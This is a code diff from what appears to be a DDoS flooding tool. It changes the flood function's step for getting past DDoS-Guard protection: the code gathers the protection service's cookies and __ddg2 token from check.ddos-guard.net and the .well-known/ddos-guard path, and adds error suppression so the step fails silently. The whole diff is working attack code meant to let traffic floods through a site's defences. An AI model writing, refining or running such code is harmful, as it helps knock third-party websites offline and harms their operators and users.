@@ -38,22 +38,33 @@ def flood(attack_id, url, stoptime) -> None:
 
     if not Core.ddosguard_cookies_grabbed: # if no cookies have been found yet, we try and grab them first
         headers = utils().buildheaders(url)
+        session = requests.session() # we can't use the utils().buildsession() function, because that one has a timeout of 0.1 ms
         idss = None
 
-        with Core.session.get(url, headers=headers, verify=False) as req:
-            for key, value in req.cookies.items():
-                Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
+        try:
+            with session.get(url, headers=headers, verify=False) as req:
+                for key, value in req.cookies.items():
+                    Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
+        except Exception:
+            pass
         
-        with Core.session.post("https://check.ddos-guard.net/check.js", headers=headers, verify=False) as req:
-            for key, value in req.cookies.items():
-                if key == '__ddg2':
-                    idss = value
+        try:
+            with session.post("https://check.ddos-guard.net/check.js", headers=headers, verify=False) as req:
+                for key, value in req.cookies.items():
+                    if key == '__ddg2':
+                        idss = value
 
-                Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
+                    Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
+        except Exception:
+            pass
         
-        with Core.session.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=headers, verify=False) as req:
-            for key, value in req.cookies.items():
-                Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
+        if idss:
+            try:
+                with session.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=headers, verify=False) as req:
+                    for key, value in req.cookies.items():
+                        Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
+            except Exception:
+                pass
         
         Core.ddosguard_cookies_grabbed = True
         print('[DDOS-GUARD] Got cookies')
